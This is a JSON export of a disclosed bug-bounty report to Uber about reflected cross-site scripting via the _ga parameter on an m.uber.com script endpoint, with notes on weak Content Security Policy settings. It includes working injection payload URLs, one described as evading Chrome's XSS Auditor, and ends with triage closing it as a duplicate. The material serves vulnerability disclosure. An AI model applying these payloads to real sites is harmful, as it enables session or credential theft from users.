{"id":300081,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDAwODE=","url":"https://hackerone.com/reports/300081","title":"SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint","state":"Closed","substate":"duplicate","severity_rating":"critical","readable_substate":"Duplicate","created_at":"2017-12-22T18:00:25.129Z","submitted_at":"2017-12-22T18:00:25.129Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gregoryvperry","url":"/gregoryvperry","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-12-26T11:03:53.114Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-12-24T20:46:24.810Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nThe _ga request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.\n\n## Security Impact\nArbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.\n\n## Reproduction Steps\nhttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf\"}}\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n\n## Specifics\nThe following unescaped code is rendered:\n\n```\n{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"_ga\":\"asdf\\\"}}\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36\",\"browser\":\n```\n\n## Impact\n\nWith properly crafted javascript and/or html, an attacker could harvest Uber login and password credentials, credit card payment information etc.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThe _ga request parameter at the \u003ca title=\"https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F0-dfffb25d2cf6ceeb0a27.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application\u0026#39;s response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.\u003c/p\u003e\n\n\u003ch2 id=\"security-impact\"\u003eSecurity Impact\u003c/h2\u003e\n\n\u003cp\u003eArbitrary SSL-protected XSS can be reflected unescaped from the \u003ca title=\"https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F0-dfffb25d2cf6ceeb0a27.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.\u003c/p\u003e\n\n\u003ch2 id=\"reproduction-steps\"\u003eReproduction Steps\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F0-dfffb25d2cf6ceeb0a27.js%3F_ga%3Dasdf%2522%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e}\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"specifics\"\u003eSpecifics\u003c/h2\u003e\n\n\u003cp\u003eThe following unescaped code is rendered:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;enabled\u0026quot;:true,\u0026quot;sid\u0026quot;:\u0026quot;bbc661585c424072\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;www.cdn-net.com\u0026quot;,\u0026quot;cf\u0026quot;:1022963},\u0026quot;queryParams\u0026quot;:{\u0026quot;_ga\u0026quot;:\u0026quot;asdf\\\u0026quot;}}\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026quot;},\u0026quot;useragent\u0026quot;:{\u0026quot;ua\u0026quot;:\u0026quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36\u0026quot;,\u0026quot;browser\u0026quot;:\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eWith properly crafted javascript and/or html, an attacker could harvest Uber login and password credentials, credit card payment information etc.\u003c/p\u003e\n","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":276134,"original_report_url":"https://hackerone.com/reports/276134","attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["fa1rlight","muhammad_uwais","gregoryvperry"],"severity":{"rating":"critical","score":9.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2242942,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for another one, @gregperry. We'll look into this and follow up once we have more information.","markdown_message":"\u003cp\u003eThanks for another one, \u003ca href=\"/gregperry\"\u003e@gregperry\u003c/a\u003e. We\u0026#39;ll look into this and follow up once we have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T18:07:36.992Z","updated_at":"2017-12-22T18:07:36.992Z","actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2243063,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Using the _ga query variable to generate arbitrary text, protected by Uber's SSL certificate, and without triggering Chrome's XSS_Auditor:\n\nhttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf\"}}\u003c/script\u003e\u003cdiv%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27\u003e\u003ca%20href%3D\"http%3A%2F%2Fwww.lyft.com\"\u003eSome%20arbitrary%20link%20text\u003c%2Fa\u003e\u003c%2Fdiv\u003e%0A","markdown_message":"\u003cp\u003eUsing the _ga query variable to generate arbitrary text, protected by Uber\u0026#39;s SSL certificate, and without triggering Chrome\u0026#39;s XSS_Auditor:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F0-dfffb25d2cf6ceeb0a27.js%3F_ga%3Dasdf%2522%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_ga=asdf%22%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e}\u0026lt;/script\u0026gt;\u0026lt;div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27\u0026gt;\u0026lt;a%20href%3D\u0026quot;http%3A%2F%2Fwww.lyft.com\u0026quot;\u0026gt;Some%20arbitrary%20link%20text\u0026lt;%2Fa\u0026gt;\u0026lt;%2Fdiv\u0026gt;%0A\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T18:46:35.529Z","updated_at":"2017-12-22T18:46:35.529Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243109,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @gregperry -- we believe this issue affects most or all of `m.uber.com`. Can you provide any evidence that the cause of the vulnerability you're reporting here is distinct from what you reported in #296701?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/gregperry\"\u003e@gregperry\u003c/a\u003e -- we believe this issue affects most or all of \u003ccode\u003em.uber.com\u003c/code\u003e. Can you provide any evidence that the cause of the vulnerability you\u0026#39;re reporting here is distinct from what you reported in \u003ca href=\"/reports/296701\"\u003e#296701\u003c/a\u003e?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:01:55.183Z","updated_at":"2017-12-22T19:01:55.183Z","actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2243139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No idea, I don't have access to the application back end.\n\nSeveral query variables are not properly escaping single quotes, with the ability to inject completely arbitrary html and/or javascript from each individual query string.\n\nIn a conventional penetration test, a client would want to know about every possible attack vector.","markdown_message":"\u003cp\u003eNo idea, I don\u0026#39;t have access to the application back end.\u003c/p\u003e\n\n\u003cp\u003eSeveral query variables are not properly escaping single quotes, with the ability to inject completely arbitrary html and/or javascript from each individual query string.\u003c/p\u003e\n\n\u003cp\u003eIn a conventional penetration test, a client would want to know about every possible attack vector.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:10:03.558Z","updated_at":"2017-12-22T19:10:03.558Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243662,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"@gregperry -- after further investigation, this is stemmed from the same issue as the one reported in #296701, which was reported before that in report #276134. As such, we are closing this report as a duplicate. ","markdown_message":"\u003cp\u003e\u003ca href=\"/gregperry\"\u003e@gregperry\u003c/a\u003e -- after further investigation, this is stemmed from the same issue as the one reported in \u003ca href=\"/reports/296701\"\u003e#296701\u003c/a\u003e, which was reported before that in report \u003ca href=\"/reports/276134\"\u003e#276134\u003c/a\u003e. As such, we are closing this report as a duplicate. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-23T01:16:48.680Z","updated_at":"2017-12-23T01:16:48.680Z","original_report_id":276134,"actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2243664,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-23T01:16:58.185Z","updated_at":"2017-12-23T01:16:58.185Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2245245,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-24T20:46:24.839Z","updated_at":"2017-12-24T20:46:24.839Z","first_to_agree":true,"actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2246686,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-26T11:03:53.040Z","updated_at":"2017-12-26T11:03:53.040Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}